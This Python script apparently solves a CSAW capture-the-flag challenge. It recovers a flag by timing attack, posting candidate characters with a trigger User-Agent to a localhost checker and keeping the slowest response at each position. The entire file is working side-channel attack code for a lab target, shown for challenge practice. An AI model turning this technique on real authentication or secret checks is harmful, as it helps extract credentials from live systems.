#!/usr/bin/env python3
"""
Timing attack solver for flagChecker.

Flag.__eq__ in inputval sleeps 10ms per matching character when
n = build * patch = 1,000,000 (set via Chrome/x.0.1000.1000 UA).
We probe each position by trying every charset character and picking
the one with the longest response time.
"""

import random
import statistics
import requests

#DO NOT CHANGE THE UA, feel free to change URL as needed though

URL    = "http://localhost:5000/check"
UA     = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/100.0.1000.1000 Safari/537.36"
)
CHARSET      = "abcdefghijklmnopqrstuvwxyz0123456789_{}"
SAMPLES      = 3
KNOWN_PREFIX = "csaw{"


def solve():
    print(f"[*] {SAMPLES} samples/candidate | charset size {len(CHARSET)}")

    with requests.Session() as session:
        session.post(URL, data={"flag": "x"}, headers={"User-Agent": UA})
        print(f"[*] Server warmed up. Starting from prefix: {KNOWN_PREFIX!r}\n")

        known = KNOWN_PREFIX

        while not known.endswith("}"):
            timings: dict[str, float] = {}

            for _ in range(SAMPLES):
                for ch in random.sample(CHARSET, len(CHARSET)):
                    r = session.post(URL, data={"flag": known + ch}, headers={"User-Agent": UA})
                    timings.setdefault(ch, []).append(r.elapsed.total_seconds())

            medians = {ch: statistics.median(t) for ch, t in timings.items()}
            best = max(medians, key=medians.__getitem__)
            top4 = sorted(medians.items(), key=lambda x: x[1], reverse=True)[:4]
            top_str = "  ".join(f"{c!r}: {t*1000:.1f}ms" for c, t in top4)
            print(f"[+] pos {len(known):>2}: {best!r}    top4 → {top_str}")

            known += best

    print(f"\n[*] Flag: {known}")
    return known


if __name__ == "__main__":
    solve()
